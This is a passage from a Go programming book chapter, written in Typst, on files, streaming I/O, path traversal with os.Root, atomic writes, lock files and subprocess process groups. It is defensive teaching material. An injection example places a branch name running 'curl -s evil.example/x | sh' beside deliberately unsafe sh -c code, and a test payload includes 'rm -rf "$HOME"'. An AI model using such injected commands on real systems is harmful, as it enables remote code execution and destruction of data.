#import "../template/book.typ": *

#chapter(5, "Talking to the Operating System: I/\u{2060}O, Files, Processes, and Signals", label: <ch-os>,
  abstract: [
    Platform tools are glue between the kernel and everything else. They
    read logs that are bigger than their memory limit, write config files
    that running services read, start other programs and wait for them, and
    run as PID 1 in containers whose limits they cannot see unless they
    look. The Go standard library makes each of these look like one function
    call. This chapter is about the gap between that call and what the
    kernel does, because that gap is where the incidents come from.
  ],
  learn: (
    [Streaming I/O in constant memory, and the two bugs that turn log processing into an incident],
    [`io/fs` and `testing/fstest` for file code you can test on any OS],
    [Path traversal and symlink attacks, and how `os.Root` stops them],
    [Atomic writes: why each of the six steps exists],
    [Lock files that cannot go stale],
    [Running subprocesses without a shell, and stopping the whole process tree],
    [PTYs, SIGPIPE, SIGHUP reloads, zombies and PID 1],
    [Reading `/proc` and cgroup v2, and making a Go binary container-aware],
  ),
  build: [
    Three packages that later chapters use: *`pkg/fsx`* (atomic writes,
    lock files, safe archive extraction), *`pkg/procx`* (subprocesses in
    their own process group) and *`pkg/sysinfo`* (procfs and cgroup v2
    readers).

    #v(4pt)
    *`limits`*, a tool that prints the limits a container really enforces,
    and a dozen small programs run for real on Linux in Docker.
  ],
)

== Where tools meet the kernel <sec-os-kernel>

Picture a nightly job that a platform team owns. It compacts audit logs,
pushes a rendered config file to every node, and shells out to `terraform`
along the way. Its business logic is a few hundred lines and well tested.
Over a quarter it still causes five incidents, and none of them is in that
logic:

- The log compactor reads each file with `io.ReadAll`. One service starts
  logging 2 GB a day, the pod hits its 1 GiB limit, and Kubernetes reports
  `OOMKilled`, exit code 137, every night.
- The fix uses `bufio.Scanner`. The job stops failing and starts
  _under-reporting_: one 1 MiB line ends the scan early, with exit code 0.
- The config push uses `os.WriteFile`. A proxy polling the file reads it
  between truncate and write, finds it empty, and serves errors.
- When CI cancels the job, the `terraform` it started keeps running and
  holds the state lock, so the next run fails.
- A long-running variant runs as PID 1 in its container and calls scripts
  that background their own children. A week later the pod hits its PID
  limit: the process table is full of zombies.

Each of these is a gap between what a Go API seems to promise and what the
operating system does. This chapter closes them one at a time, and the
fixes go into three packages: `pkg/fsx` for files, `pkg/procx` for
processes and `pkg/sysinfo` for reading what the kernel knows about us.

Everything Linux-specific in this chapter runs for real. The demo programs
are cross-compiled with `CGO_ENABLED=0 GOOS=linux`, copied into a
`FROM scratch` image called `pgo-ch05`, and run with `docker run`;
`book/scripts/capture-ch05.sh` regenerates every terminal block. Host runs
were made on macOS on an Apple M5. Where the two systems behave
differently, the text says so.

== Streaming I/O in constant memory <sec-os-stream>

`io.Reader` and `io.Writer` are the most important interfaces in Go
because nearly everything implements them: files, sockets, pipes, HTTP
bodies, gzip streams, hashes, buffers. Their contract is short, and two
parts of it are routinely misread:

- `Read` may return `n > 0` _and_ a non-nil error in the same call,
  including `io.EOF`. Process the `n` bytes first, then look at the error.
- `Read` may return fewer bytes than you asked for at any time, even when
  more data is coming. Pipes and sockets do this constantly. Use
  `io.ReadFull` when you need an exact count.

Composition is what makes the interfaces worth having. The log scanner
built in this section reads a gzipped log through four layers, and each
layer is ignorant of the others:

#fig(caption: [A streaming pipeline. Each stage holds a fixed-size buffer, so memory use does not depend on the size of the input.])[
  #diagram(
    spacing: (16pt, 12pt),
    dnode((0, 0), [`*os.File`\ access.log.gz], kind: "muted"),
    dnode((1, 0), [`bufio.Reader`\ 64 KiB], kind: "accent"),
    dnode((2, 0), [`gzip.Reader`\ ~40 KiB window], kind: "accent"),
    dnode((3, 0), [`Lines`\ 64 KiB, truncates], kind: "accent"),
    dnode((4, 0), [`Stats`\ counters], kind: "dark"),
    dedge((0, 0), (1, 0), "-|>"),
    dedge((1, 0), (2, 0), "-|>"),
    dedge((2, 0), (3, 0), "-|>"),
    dedge((3, 0), (4, 0), "-|>"),
  )
] <fig-os-pipeline>

=== `io.ReadAll` on input you do not control

The simplest way to process a file is to read all of it and split it into
lines. This is the version that passes every test and then pages someone:

#src("examples/ch05/logscan/naive.go", region: "naive")

To measure the damage, `loggen` writes a deterministic access log of 30
million lines, one of which is a request with a 1 MiB query string:

#output("ch05/loggen.txt")

Run against that 2.2 GB file, the `ReadAll` version is correct, and needs
about 5 GB of memory to be correct:

#output("ch05/logscan-readall.txt", cmd: "logscan -mode readall access.log")

The peak is more than twice the file size. `io.ReadAll` reads into a series
of growing chunks and copies them into one right-sized slice at the end, so
for a moment the data exists twice, and `bytes.Split` then allocates a
24-byte slice header for each of the 30 million lines, another 720 MB.
On a laptop with 24 GB this is merely wasteful. In a container with a memory limit it is fatal, and the failure gives you
nothing to debug:

#output("ch05/logscan-oom.txt")

The kernel's OOM killer sent `SIGKILL`, so the program printed nothing at
all: no partial result and no error message, only exit status 137
(128 + 9) and the `OOMKilled` flag. Setting `GOMEMLIMIT` makes no
difference, and it is worth understanding why. `GOMEMLIMIT` is a _soft_
limit that tells the garbage collector to work harder as the heap
approaches it. It can reclaim garbage, but every byte here is live data
that the program is still using. No collector can free it.

#warning(title: [Unbounded input is everywhere])[
  Files are the obvious case. The same bug hides in `io.ReadAll(resp.Body)`
  for an HTTP response you did not size, in `exec.Cmd.Output()` for a
  subprocess that can print without limit, and in `json.Unmarshal` of a
  request body. Bound every one of them: `http.MaxBytesReader` for server
  request bodies, `io.LimitReader` everywhere else, and a decoder that
  streams (`json.Decoder`) instead of a function that needs the whole
  input.
]

=== The `bufio.Scanner` trap

The usual fix is `bufio.Scanner`, which reads line by line through a
buffer. It is the right tool with one sharp edge. A token, here a line,
must fit in the scanner's buffer, which is at most `bufio.MaxScanTokenSize`
(64 KiB) by default. When a line is longer, `Scan` returns `false`, exactly
as it does at the end of the input. The error is only available from
`Err`, and code that forgets to call it looks finished:

#output("ch05/logscan-scanner.txt")

One million lines out of thirty, and exit status 0. The scan stopped at
the 1 MiB line and the program reported a partial result as if it were the
whole file. This is worse than the OOM kill, because nothing alerts.

There are two fixes, and they answer different questions. If long lines
are legitimate and bounded, give the scanner a bigger ceiling and _always_
check `Err`:

#code(file: "scanner-fixed.go")[```go
sc := bufio.NewScanner(r)
sc.Buffer(make([]byte, 0, 64<<10), 4<<20) // start at 64 KiB, allow up to 4 MiB
for sc.Scan() {
	process(sc.Bytes()) // valid only until the next Scan
}
if err := sc.Err(); err != nil { // bufio.ErrTooLong, or a read error
	return fmt.Errorf("scan %s: %w", name, err)
}
```]

If the input is untrusted, such as logs written by other teams' services,
any ceiling can be exceeded, and one bad line should not stop the job. Then
read with `bufio.Reader.ReadSlice`, which returns `bufio.ErrBufferFull`
instead of growing, keep the start of an over-long line, and skip the
rest:

#src("examples/ch05/logscan/scan.go", region: "lines")

`ReadSlice` returns a view into the reader's buffer rather than a copy, so
the common case allocates nothing. The cost is the same rule `Scanner.Bytes`
has: the slice is only valid until the next read, which the `Line` type
documents. The result on the same 2.2 GB file:

#output("ch05/logscan-stream.txt", cmd: "logscan access.log")

All 30 million lines, one truncated and therefore without a status field,
read at well over a gigabyte per second with a peak resident set of a few
megabytes. The file could be 200 GB and the peak would be the same. On
Linux, in a container with a 64 MiB limit, a sixteenth of what the
`ReadAll` version was killed at:

#output("ch05/logscan-docker.txt")

Linux counts a higher peak RSS for the same program, but it is just as
flat in the input size, and that is the property that matters.
Composition then costs nothing extra: `scanFile` adds a `gzip.Reader` in
front of `Lines` for names ending in `.gz` (@fig-os-pipeline), and
scanning a directory of rotated logs is a loop over `fs.Glob`.

=== `io.Copy` and buffer sizes

`io.Copy` moves bytes from a `Reader` to a `Writer` through a 32 KiB
buffer. People tune that buffer, so it is worth measuring what it buys.
The benchmark copies a 256 MiB file, warm in the page cache, into a writer
that only counts newlines and records the largest single write it
receives, which is the buffer size the copy really used:

#src("examples/ch05/copybuf/copybuf_test.go", region: "bench")

#output("ch05/copybuf.txt", cmd: "go test -run '^$' -bench . -benchtime 20x -count 5 ./examples/ch05/copybuf",
  title: "condensed: median MB/s of five runs")

Each `read` system call has a fixed cost, so 512-byte reads are ten times
slower than 32 KiB ones. Past 32 KiB the curve flattens: a megabyte buffer
adds about 15 percent here, and on a network or a cold disk the device
dominates and the difference disappears. (The absolute numbers move with
whatever else the machine is doing; the shape does not.) The default is
right for almost everything.

The last line is the trap, and the "largest write" column proves it.
`io.CopyBuffer` uses your buffer only if neither side has a fast path.
`*os.File` implements `io.WriterTo`, so passing a file directly makes
`CopyBuffer` call `f.WriteTo`, which falls back to a plain `io.Copy` with
its own 32 KiB buffer and silently ignores the megabyte you allocated. The
other runs wrap the file in `struct{ io.Reader }` to hide the method.
On Linux those fast paths matter for real: `File.WriteTo` uses `sendfile(2)` when the destination is a TCP
or Unix socket, and `File.ReadFrom` uses `copy_file_range(2)` or
`splice(2)`, so data moves inside the kernel without passing through your
process. A plain `io.Copy(conn, file)` is often the fastest code you can
write.

== Code against `io/fs`, test against a map <sec-os-iofs>

`logscan -dir` works through `scanFS`, which takes an `fs.FS` rather than
a directory name. `io/fs` (Go 1.16) defines
a read-only file system as a single method, `Open(name) (fs.File, error)`,
with optional interfaces for faster paths: `ReadFileFS`, `ReadDirFS`,
`StatFS`, `GlobFS`, `SubFS`, and since Go 1.25 `ReadLinkFS` for symbolic
links. Helper functions such as `fs.ReadFile`, `fs.Glob` and `fs.WalkDir`
use the fast path when it exists and fall back to `Open` when it does not.
Names are always slash-separated and unrooted (`logs/app.log`, never
`/logs` or `../logs`) on every OS, which removes a whole class of
Windows-versus-Unix bugs.

Implementations include `os.DirFS(dir)`, `embed.FS`, `zip.Reader`,
`Root.FS()` (@sec-os-root) and, for tests, `fstest.MapFS`: a map from path
to contents, with directories implied. This test builds a plain log, a
gzipped rotation and a file the glob must skip, with no temporary
directory and no cleanup:

#src("examples/ch05/logscan/scan_test.go", region: "fstest")

The same idea scales further than it first appears. `pkg/sysinfo`
(@sec-os-proc) reads
`/proc` and `/sys/fs/cgroup` through an `fs.FS`, so a `MapFS` can play a
container with a 256 MiB memory limit on a Mac, and the Linux-only parsing
is tested on every developer's machine.

`fstest.TestFS` is the other half of the package. Given a file system and
the files it should contain, it checks that every interface the
implementation claims (`ReadDir`, `Stat`, `Glob`, `Sub`) agrees with
`Open`. Run it against any `fs.FS` you write; the archive tests in
@sec-os-root run it against an extracted tree.

#warning(title: [`os.DirFS` is not a sandbox])[
  The documentation is explicit: `os.DirFS("/prefix").Open("file")` is the
  same as `os.Open("/prefix/file")`. If `file` is a symbolic link to
  `/etc/shadow`, `DirFS` follows it. `fs.ValidPath` rejects `..` in the
  name, but not a symlink that leads out. When the tree may contain
  content you did not create, use `Root.FS()`.
]

== Paths you did not choose: traversal and `os.Root` <sec-os-root>

Tools constantly turn untrusted strings into file paths: names inside an
archive, a path from an API request, a key from a config file, a file name
in a Git repository. The classic bug has a name, _zip slip_, after a 2018
disclosure that found it in archive libraries across most ecosystems. In
Go it usually looks like the extractor below. `filepath.Join` cleans `..`
elements, which is exactly the problem: joined with `out`, the name
`../escaped.txt` becomes `escaped.txt`, outside the destination. Symbolic
links make it worse, because an archive can contain a link named `logs`
that points to `..` and then a regular file named `logs/via-symlink.txt`.
Each name looks innocent on its own.

#src("examples/ch05/untar/main.go", region: "naive")

The demo builds such an archive and extracts it both ways:

#output("ch05/untar.txt")

The naive extractor wrote two files outside `out`. In a real attack the
targets are `~/.ssh/authorized_keys`, a cron directory, or a binary on
`PATH`, and the archive arrives as a Helm chart, a Terraform module or a
build artifact.

=== Directory-limited access with `os.Root`

Validating names by hand is harder than it looks. A correct check has to
handle `..`, absolute paths, symlinks at every component, symlinks
_created by earlier entries_ in the same archive, and the race where
another process swaps a directory for a symlink between your check and
your write. Go 1.24 moved that work into the standard library.

#newingo("1.24", title: [`os.Root`: directory-limited file access])[
  `os.OpenRoot(dir)` opens a directory and returns an `*os.Root`. Its methods
  (`Open`, `Create`, `OpenFile`, `Mkdir`, `Remove`, `Stat`, `Lstat`, ...)
  take names relative to the root and fail if any component, including a
  symlink, would resolve outside it. On Unix the root holds a directory
  file descriptor, and every operation walks the path one component at a
  time with `openat(2)` and `O_NOFOLLOW`, resolving each symlink itself and
  refusing any step that would climb above the root. Because it works from
  the descriptor, renaming or replacing the directory path afterwards does
  not redirect it.
]

Go 1.25 completed the API with `Chmod`, `Chown`, `Chtimes`, `Lchown`,
`Link`, `MkdirAll`, `ReadFile`, `Readlink`, `RemoveAll`, `Rename`,
`Symlink` and `WriteFile`, so a tool can do all of its file work through
a `Root`, and `Root.FS()` returns an `fs.FS` that cannot be escaped.

`fsx.ExtractTar(r, root, limits)` reads entries with `tar.Reader.Next`,
stops after `MaxFiles` entries, and hands each one to `extractEntry`
along with what is left of a `MaxBytes` budget. Every file operation goes
through the root, and one policy decision is its own:

#src("pkg/fsx/extract.go", region: "extract")

Three details are deliberate. Files are opened with `O_EXCL`, so an entry
can never write through something that is already at its name, whether a
symlink, a FIFO or an earlier entry. Permission bits are reduced to
`Perm()`, which drops setuid and setgid: an archive should not be able to
create a setuid binary just because the extractor runs as root. And
symlinks whose target would leave the root are refused even though the
`Root` would refuse to _follow_ them, because the program that later uses
the extracted tree, a compiler or a web server, will not be using a `Root`.
`filepath.IsLocal` (Go 1.20) is the lexical check: it rejects absolute
paths, `..` escapes, empty names and, on Windows, reserved names like
`NUL`.

The tests try each attack in turn from a table of archives, plus a
symlink planted in the destination before extraction starts, which only
`os.Root` can catch, and log the error each one produces:

#output("ch05/extract-test.txt", cmd: "go test -v -run 'TestExtractTar(RejectsEscapes|RefusesPlantedSymlink)' ./pkg/fsx")

The messages show which layer refused: "path escapes from parent" is
`os.Root` refusing a `..` or a symlink, and "file exists" is `O_EXCL`. Note also that `README.md` was extracted before the bad entry
stopped the safe run. For deployable artifacts, extract into a temporary
directory and rename it into place only when extraction succeeds, which is
the atomic-replace idea of the next section applied to a directory.

#warning(title: [What `os.Root` does not cover])[
  The documentation lists the limits. A root does not stop traversal into
  other file systems mounted inside it, Linux bind mounts, `/proc` magic
  links or device files. On Unix, `Root.Chmod`, `Chown` and `Chtimes` can
  be redirected by a symlink swapped in during the call. And a root
  constrains _paths_, not resources: archive bombs (a 1 KB file that
  decompresses to 10 GB, or a million empty files) still need the byte and
  file limits in `Limits`.
]

== Writing files that survive crashes <sec-os-atomic>

`os.WriteFile` opens the file with `O_TRUNC`, writes, and closes. That is
three separate moments when another process can look at the file, and two
of them show something that is neither the old version nor the new one.
`torn` rewrites a 256 KiB config file in a loop for two seconds while a
goroutine reads it, the way a service polls its config, and classifies
every read that is neither version:

#session(("torn -mode naive", "ch05/torn-naive.txt"), ("torn -mode atomic", "ch05/torn-atomic.txt"))

With `os.WriteFile`, about one read in thirteen saw an empty or truncated
file; the rate varies from run to run, and some runs also catch a read
that mixes both versions. A service that treats "empty config" as "no
routes" has an outage measured in milliseconds, often enough to matter at
scale.

Concurrent readers are the visible half of the problem. The other half is
crashes. File systems do not write your data to disk when `write` returns:
the data sits in the page cache and reaches the device later, often tens
of seconds later, in an order the file system chooses. After a power loss
or kernel panic, a file updated with truncate-and-write can come back
empty, or with its old size but new contents in some blocks. In 2009,
ext4's delayed allocation made zero-length files after crashes common
enough that the kernel added heuristics (the `auto_da_alloc` mount option)
to protect applications that replaced files without calling `fsync`. Do
not depend on heuristics.

=== The six steps

The safe sequence writes a complete new file next to the old one and
swaps the name over in one atomic step. @fig-os-atomic shows the sequence
and what a crash at each point leaves behind:

#fig(placement: auto, caption: [Atomic replacement. A crash at any point leaves either the complete old file or the complete new one under the target name, plus at worst a stray temporary file.])[
  #diagram(
    spacing: (18pt, 9pt),
    dnode((0, 0), [1 · `CreateTemp` in the same directory], kind: "accent"),
    dnode((0, 1), [2 · write the new contents], kind: "accent"),
    dnode((0, 2), [3 · `Chmod` to the final mode], kind: "accent"),
    dnode((0, 3), [4 · `Sync`: data reaches the device], kind: "accent"),
    dnode((0, 4), [5 · `Rename` temp → target (atomic)], kind: "dark"),
    dnode((0, 5), [6 · `Sync` the directory], kind: "accent"),
    dnode((1, 1), [crash: old file intact,\ temp file left over], kind: "good"),
    dnode((1, 3), [skip step 4: rename can reach disk\ before data → empty file], kind: "warn"),
    dnode((1, 5), [skip step 6: rename may be lost\ → old file comes back], kind: "warn"),
    dedge((0, 0), (0, 1), "-|>"),
    dedge((0, 1), (0, 2), "-|>"),
    dedge((0, 2), (0, 3), "-|>"),
    dedge((0, 3), (0, 4), "-|>"),
    dedge((0, 4), (0, 5), "-|>"),
    dedge((0, 1), (1, 1), "--"),
    dedge((0, 3), (1, 3), "--"),
    dedge((0, 5), (1, 5), "--"),
  )
] <fig-os-atomic>

#src("pkg/fsx/atomic.go", region: "atomic")

Each step exists for a reason:

+ *Same directory.* `rename(2)` is atomic only within one file system.
  Across file systems it fails with `EXDEV`, and `/tmp` is often a
  separate `tmpfs`. Creating the temporary file next to the target
  guarantees the rename is local. The leading dot keeps it out of most
  globs, so a config loader scanning `*.yaml` does not pick up a half-written
  file.
+ *Write.* Nobody can see the data yet, because nothing refers to the
  temporary name. A `bufio.Writer` turns many small writes from the
  caller's `fill` function into few system calls.
+ *Chmod.* `CreateTemp` creates files with mode `0600`. Without this step
  a world-readable config becomes private after its first atomic update,
  and the service running as another user stops reading it. (An explicit
  `Chmod` is not reduced by the umask, unlike the `perm` of `os.WriteFile`.)
+ *Sync the file.* Without it, the file system may persist the rename
  before the data blocks. After a crash the name points at the new inode
  and the inode is empty. This is the ext4 failure above.
+ *Rename.* POSIX guarantees that a process opening the target sees the
  old file or the new one, never neither. Readers that already have the
  old file open keep reading the old inode, which stays alive until they
  close it.
+ *Sync the directory.* The rename changed a directory entry, and
  directories are files with their own dirty pages. Until the directory is
  flushed, a crash can roll the rename back. Most file systems journal
  this, but only the directory `fsync` makes it a guarantee rather than a
  likely outcome.

The deferred cleanup removes the temporary file on any failure, so a full
disk does not leave `.config.yaml.tmp-*` files accumulating. The tests in
`pkg/fsx` pin that down, and `TestReadersNeverSeeTornFiles` checks the
property `torn` measured, with four readers against 200 rewrites.

#internals(title: [The price of durability])[
  `torn -mode atomic` managed about 110 writes a second. Almost all of
  that is `fsync`. On macOS, Go's `File.Sync` issues `fcntl(F_FULLFSYNC)`,
  because a plain `fsync` there only pushes data to the drive, whose own
  cache may still lose it; the full flush costs milliseconds. On Linux,
  `fsync` also asks the device to flush its volatile write cache, and costs
  anything from well under a millisecond on an enterprise NVMe drive to
  tens of milliseconds on network block storage. Atomic writes are for
  files that matter: config, state, checkpoints, credentials. A log file is
  append-only and needs neither the rename nor an `fsync` per line.
]

Renaming has limits: it replaces a symlink at the target name instead of
writing through it, the new inode loses hard links, extended attributes
and ownership unless you copy them, and it needs write permission on the
directory. On Windows, `os.Rename` maps to `MoveFileEx` with
`MOVEFILE_REPLACE_EXISTING`, which fails if another process holds the
target open without `FILE_SHARE_DELETE`.

`examples/ch05/atomicput` wraps `fsx.Write` as a command that copies
standard input to a file. Its `fill` function shows the other bounded-I/O
idiom of this chapter: copy through `io.LimitReader(os.Stdin, limit+1)`,
and if more than `limit` bytes arrived, fail. One extra byte detects an
oversized input without ever buffering it.

#production(title: [Atomic config deploys])[
  Kubernetes ConfigMap and Secret volumes are updated the same way, one
  level up. The kubelet writes every key into a fresh timestamped
  directory, then atomically renames a symlink called `..data` to point at
  it. Each key in the mount is a symlink through `..data`, so a reader sees
  the whole old set or the whole new set. Two consequences catch people
  out. A file watcher on `config.yaml` sees no write event, because the
  file never changes; watch the directory, or poll. And a volume mounted
  with `subPath` bypasses the symlink and never updates at all. For files
  you deploy yourself, the rule is the one in this section: write the new
  version beside the old, `fsync`, rename, `fsync` the directory, then
  signal the service (@sec-os-signals).
]

== Locks for tools that must not run twice <sec-os-lock>

Some tools must never run concurrently with themselves on one machine: a
backup that snapshots a database, a migration, a certificate renewal, a
node agent's upgrade step. Cron makes overlap easy: if Tuesday's run takes
longer than the interval, Wednesday's starts anyway. The usual answer is a
lock file, and there are several ways to build one.

The traditional _pid file_ creates the file with `O_CREAT|O_EXCL`, which
fails if it exists, writes the process ID into it, and deletes it on exit.
Its problem is the word "exit":

#output("ch05/lock-pidfile.txt")

`kill -9`, an OOM kill or a power cut skips the cleanup, and every later
run refuses to start until someone deletes the file by hand. Checking
whether the recorded PID is alive with `kill(pid, 0)` has two holes: PIDs
are reused, so an unrelated process may have that number (recording the
start time from `/proc/<pid>/stat` as well fixes this, @sec-os-proc), and
two runs that both decide the file is stale can both delete it and both
proceed. The fix for the race is to stop using file existence as the
lock.

=== `flock`: a lock the kernel releases for you

`flock(2)` takes an advisory lock on an open file. The kernel ties the lock
to the open file description and releases it when the last descriptor
referring to it is closed, which happens automatically when the process
exits for any reason, including `SIGKILL`. A flock lock cannot go stale.

#src("pkg/fsx/lock_unix.go", region: "flock")
#src("pkg/fsx/lock.go", region: "trylock")

The file's _existence_ means nothing here; only the kernel lock does. That
changes how you treat the file:

- *Never delete it on unlock.* If process A holds the lock and B is
  waiting on the same file, and A unlinks the file as it unlocks, B gets
  the lock on an inode that no longer has a name. Meanwhile C creates a
  fresh file at the same path and locks _that_. B and C now both believe
  they are alone. `Unlock` releases and closes, and leaves the file.
- *Check the inode after locking.* Someone else may still delete it: an
  operator tidying up, or `systemd-tmpfiles` cleaning `/tmp`. After
  getting the lock, `TryLock` compares the open file with what the path
  names now (`os.SameFile`), and retries if they differ.
- *Write diagnostics into it.* The holder records its PID, host and start
  time. Losers include that in their error, which turns "lock held" into
  something an on-call engineer can act on. The record is advisory; the
  kernel lock is the truth.

`fsx.Acquire` adds waiting. A blocking `flock` cannot be interrupted by a
context, so it polls `TryLock` with backoff up to 500 ms and gives up when
the context ends. Two processes contending for the lock, then a holder
that is killed outright:

#output("ch05/lock-flock.txt")

B fails at once, prints the holder's record, and exits with status 75
(`EX_TEMPFAIL`, "try again later", which tells a scheduler the failure is
not a bug). C waits, and gets the lock within a poll interval of A
releasing it. D is killed with `SIGKILL` while holding the lock, and E
acquires it immediately, because the kernel closed D's descriptors.
`TestLockReleasedWhenHolderIsKilled` checks the same in CI: it re-runs the
test binary as a helper that takes the lock, confirms the holder record
names the helper's PID, kills it with `SIGKILL`, and takes the lock.

=== Which lock, where

#table(
  columns: (auto, 1fr, 1fr),
  table.header([Mechanism], [Semantics], [Watch out for]),
  [pid file (`O_EXCL`)], [Existence is the lock], [Stale after any crash; PID reuse; racy stale detection],
  [`flock`], [Per open file description; released on last close; whole file], [Advisory: only cooperating programs respect it. A child that inherits the descriptor keeps the lock alive. On NFS, Linux emulates it with byte-range locks],
  [`fcntl` `F_SETLK`], [Per _process_, byte ranges. Linux 3.15+ adds `F_OFD_SETLK`, owned by the open file description like `flock`], [Closing _any_ descriptor for the file releases all of the process's locks on it, including one opened by a library. Two opens in one process never conflict],
  [Windows `LockFileEx`], [Mandatory byte-range lock on a handle; released when the handle closes], [Other processes cannot read or write the locked range],
)

`pkg/fsx` uses `flock` on Unix and `LockFileEx` on Windows
(`lock_windows.go`, which compiles under `GOOS=windows`; it is not run in
CI). Go opens every file with `O_CLOEXEC`, so a child started with
`os/exec` does not inherit the lock unless you pass the descriptor in
`ExtraFiles`. In C programs that `fork` without `O_CLOEXEC`, a long-lived
child holding the lock open is a classic source of "the lock is held, but
nobody is running".

#tip(title: [Where lock files live])[
  Put lock files in `/run/<tool>/` (or `$XDG_RUNTIME_DIR` for per-user
  tools), not `/tmp`. `/run` is a `tmpfs` cleared at boot, which is the
  right lifetime for a lock, and it is not swept by `tmp` cleaners.
]

All of this is per machine. A lock that must hold across a fleet (one
backup per database, one leader per controller) needs a lease in a shared
system: a Kubernetes `Lease` object, a row in a database, or a key with a
TTL. Chapter 16 covers distributed locks and why they need fencing tokens.

== Running other programs <sec-os-exec>

Platform tools shell out constantly: `git`, `terraform`, `helm`, `kubectl`,
compilers, a customer's hook script. `os/exec` makes starting a process
look trivial. Stopping it correctly is the hard part.

=== What happens when you run a command

`exec.Command(name, args...)` resolves `name` against `PATH` (unless it
contains a slash), and `Start` asks the kernel for a new process. On Linux
the runtime uses `clone(2)` with `CLONE_VFORK|CLONE_VM`: the child shares
the parent's memory just long enough to set up file descriptors, process
group and credentials, then calls `execve(2)` to replace itself with the
new program. That avoids copying the page tables of a large Go process for
a child that is about to discard them. `execve` keeps the PID, the open
descriptors that lack `O_CLOEXEC`, the signal mask and resource limits,
and replaces everything else.

If `Stdout` is an `*os.File`, the child gets that descriptor directly.
If it is any other `io.Writer`, `os/exec` creates a pipe and a goroutine
that copies from it, and `Wait` waits for that copy to finish; remember
that, because it is behind one of the bugs below. `Wait` collects the exit
status and frees the kernel's record of the child; until then, an exited
child is a _zombie_. Since Go 1.23, `os` uses pidfds for `Wait` and
`Signal` on Linux 5.4+, so a signal can never hit an unrelated process
that reused the PID.

#interview(title: [“What happens when you run a command from Go?”])[
  Walk down the layers. `exec.Command` resolves the binary on `PATH` (and
  since Go 1.19 refuses a match in the current directory, returning
  `exec.ErrDot`). `Start` creates the child with `clone` and `CLONE_VFORK`,
  sets up stdin, stdout, stderr and any `ExtraFiles`, applies
  `SysProcAttr` (process group, credentials, namespaces), and calls
  `execve`. Pipes to non-file writers get a copying goroutine. `Wait`
  reaps the child with `wait4` or a pidfd and joins the copy goroutines.
  Then add the production points: no shell, so arguments cannot be
  injected; a context with `Cancel` and `WaitDelay` so a stuck child cannot
  hang you; and a process group so cancellation reaches grandchildren.
]

=== No shell

The single most important rule is to pass arguments as a list and never
build a shell command string. `execve` receives an argument vector, so
`$(...)`, `;`, `*` and quotes have no meaning unless a shell parses them;
the `procx` tests pass `$(touch pwned); rm -rf "$HOME" #` and check the
child sees exactly that string. Two smaller injection routes remain. An
argument starting with `-` can be read as an option, which is why the
example below uses Git's `--end-of-options` (most tools accept `--` for
the same purpose). And `PATH` itself is input: Go 1.19 stopped
`exec.LookPath` from returning programs found through a relative `PATH`
entry such as `.`, which used to let a malicious repository plant its own
`git` in the working directory.

#code(file: "injection.go", caption: "don't ship the first one")[```go
// branch comes from a webhook payload. A branch named
//   main; curl -s evil.example/x | sh
// runs the attacker's script with the CI runner's credentials.
exec.Command("sh", "-c", "git log --oneline "+branch).Output()

// The argument list goes straight to execve. No shell ever parses it.
exec.CommandContext(ctx, "git", "log", "--oneline", "--end-of-options", branch)
```]

If you need a pipeline, build it in Go: connect the commands with
`cmd2.Stdin, _ = cmd1.StdoutPipe()` and `Wait` for both.

=== Cancellation: `Cancel`, `WaitDelay` and the leak

`exec.CommandContext` kills the child when the context is done. Before Go
1.20 that meant `SIGKILL` and nothing else.

#newingo("1.20", title: [`Cmd.Cancel` and `Cmd.WaitDelay`])[
  `Cancel` is the function called when the context is done; the default is
  `Process.Kill`. Setting it lets you send `SIGTERM` instead and give the
  child a chance to clean up. `WaitDelay` bounds what happens next: after
  the context is done (or the child has exited) and `WaitDelay` has
  passed, `os/exec` kills the child if it is still running and closes the
  pipes it was copying from, so `Wait` returns even if something else
  still holds them. Without `WaitDelay`, `Wait` reads pipes until EOF,
  which may be never.
]

Neither knob reaches _grandchildren_, and most interesting commands have
some. A `make` runs compilers, a shell script runs its pipeline, `helm`
runs plugins, `terraform` runs providers. `orphans` reproduces the shape
with a worker that starts a long-running sleeper and waits for it, then
cancels the worker with the standard library's default behaviour:

#output("ch05/orphans-exec.txt", cmd: "docker run --rm --init pgo-ch05 /orphans -kill exec")

`Wait` returned, `signal: killed`, and from the tool's point of view the
job is over. The sleeper is still running. Its parent died, so the kernel
re-parented it to PID 1, here `docker-init`. In a CI job it would keep
running until the runner tears down the machine, holding whatever it held:
a state lock, a port, a database connection, a mounted volume.

=== Process groups

Every process belongs to a _process group_, identified by the PID of its
leader, and `kill(2)` with a negative PID signals every member of the
group. Children inherit their parent's group. So if the tool puts the
worker in a new group, everything the worker starts lands in it too, and
the whole tree can be stopped with one call:

#fig(caption: [With `Setpgid`, the worker leads a new group and its descendants join it. `Process.Kill` signals one PID; `kill(-pgid)` signals the group.])[
  #diagram(
    spacing: (24pt, 14pt),
    dnode((0, 0), [tool · PID 7\ group 7], kind: "dark"),
    dnode((1, 0), [worker · PID 13\ group 13 (leader)], kind: "accent"),
    dnode((2, 0), [sleeper · PID 19\ group 13], kind: "accent"),
    dnode((1, 1), [`Process.Kill()`\ → PID 13 only], kind: "warn"),
    dnode((2, 1), [`kill(-13, SIGTERM)`\ → 13 and 19], kind: "good"),
    dedge((0, 0), (1, 0), "-|>", label: [starts]),
    dedge((1, 0), (2, 0), "-|>", label: [starts]),
    dedge((1, 1), (1, 0), "--|>"),
    dedge((2, 1), (1, 0), "--|>"),
    dedge((2, 1), (2, 0), "--|>"),
  )
] <fig-os-pgroup>

`procx.Command` is `exec.CommandContext` with three changes:

#src("pkg/procx/procx.go", region: "command")
#src("pkg/procx/group_unix.go", region: "group")

The flow on cancellation is: the context ends, `Cancel` sends `SIGTERM` to
the whole group, and everyone gets the same chance to clean up. If the
leader is still running `WaitDelay` later, `os/exec` sends it `SIGKILL` and
closes the pipes. Then `Wait` finishes the job:

#src("pkg/procx/procx.go", region: "wait")

That last `SIGKILL` encodes a policy: _the leader's exit ends the group's
lifetime_. Anything still in the group when the command we started has
exited is a descendant it abandoned. Usually the call fails with `ESRCH`
because nothing is left. There is a small window in which the group's
number could be reused, since the kernel can recycle a PID once no process
uses it as a PID, group or session ID; for a tool that starts a handful of
commands this is negligible, and the airtight alternative is below. The
same run with `procx`:

#output("ch05/orphans-group.txt", cmd: "docker run --rm --init pgo-ch05 /orphans -kill group")

Note the `PGID` column: the worker and the sleeper are in group 13, the
tool in its own group 7. `Wait` reports `signal: terminated`, the
graceful signal, and nothing is left.

`Wait` with `WaitDelay` also fixes the most common hang in code that runs
commands. If a child starts a background process that inherits its stdout,
and `Stdout` is a buffer, `Output` waits for EOF on the pipe, which only
